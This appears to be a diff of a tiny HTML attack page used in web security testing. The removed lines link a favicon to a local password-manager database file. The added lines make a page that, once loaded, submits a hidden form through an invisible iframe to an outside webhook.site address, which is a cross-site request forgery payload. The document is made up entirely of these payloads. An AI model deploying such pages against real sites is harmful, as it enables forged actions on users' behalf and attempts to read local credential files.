@@ -1,12 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="icon" href="file:///app/instance/password_manager.db" >
-</head>
-<body>
-  <input type="text" value="">
-</body>
+<html>
+                <body>
+
+                    <iframe  name="frame"></iframe>
+
+                    <form method="post" action="https://webhook.site/debe482d-4f6b-4bba-a5e3-c75e4db2418a" target="frame" id="form">
+                        <input type="hidden" name="title" value="CSRF" />
+                        <input type="hidden" name="body" value="CSRF" />
+                        <input type="hidden" name="user" value="tester" />
+                    </form>
+
+                    <script>document.getElementById('form').submit()</script>
+
+                </body>
 </html>
